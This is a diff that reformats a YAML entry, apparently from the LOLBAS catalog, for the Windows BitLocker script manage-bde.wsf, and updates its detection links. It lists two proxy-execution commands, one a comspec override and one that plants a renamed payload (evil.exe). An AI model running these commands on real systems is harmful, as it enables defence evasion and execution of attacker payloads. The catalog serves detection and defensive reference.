@@ -1,38 +1,43 @@
----
 Name: Manage-bde.wsf
 Description: Script for managing BitLocker
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf
-    Description: Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.
-    Usecase: Proxy execution from script
-    Category: Execute
-    Privileges: User
-    MitreID: T1216
-    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
-    Description: Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
-    Usecase: Proxy execution from script
-    Category: Execute
-    Privileges: User
-    MitreID: T1216
-    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+- Command: set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf
+  Description: Set the comspec variable to another executable prior to calling manage-bde.wsf
+    for execution.
+  Usecase: Proxy execution from script
+  Category: Execute
+  Privileges: User
+  MitreID: T1216
+  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
+    11
+- Command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\
+    & cscript.exe c:\windows\system32\manage-bde.wsf
+  Description: Run the manage-bde.wsf script with a payload named manage-bde.exe in
+    the same directory to run the payload file.
+  Usecase: Proxy execution from script
+  Category: Execute
+  Privileges: User
+  MitreID: T1216
+  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
+    11
 Full_Path:
-  - Path: C:\Windows\System32\manage-bde.wsf
+- Path: C:\Windows\System32\manage-bde.wsf
 Code_Sample:
-  - Code:
+- Code: null
 Detection:
-  - Sigma: https://github.com/SigmaHQ/sigma/blob/3107ede1c4d253c89a26f3a0be79122a3a562f29/rules/windows/process_creation/win_manage_bde_lolbas.yml
-  - IOC: Manage-bde.wsf should not be invoked by a standard user under normal situations
+- Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_rundll32_activity.yml
+- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___syssetup.yml
+- Splunk: https://research.splunk.com/endpoint/71b9bf37-cde1-45fb-b899-1b0aa6fa1183/
 Resources:
-  - Link: https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
-  - Link: https://twitter.com/bohops/status/980659399495741441
-  - Link: https://twitter.com/JohnLaTwC/status/1223292479270600706
+- Link: https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
+- Link: https://twitter.com/bohops/status/980659399495741441
+- Link: https://twitter.com/JohnLaTwC/status/1223292479270600706
 Acknowledgement:
-  - Person: Jimmy
-    Handle: '@bohops'
-  - Person: Daniel Bohannon
-    Handle: '@danielbohannon'
-  - Person: John Lambert
-    Handle: '@JohnLaTwC'
+- Person: Jimmy
+  Handle: '@bohops'
+- Person: Daniel Bohannon
+  Handle: '@danielbohannon'
+- Person: John Lambert
+  Handle: '@JohnLaTwC'
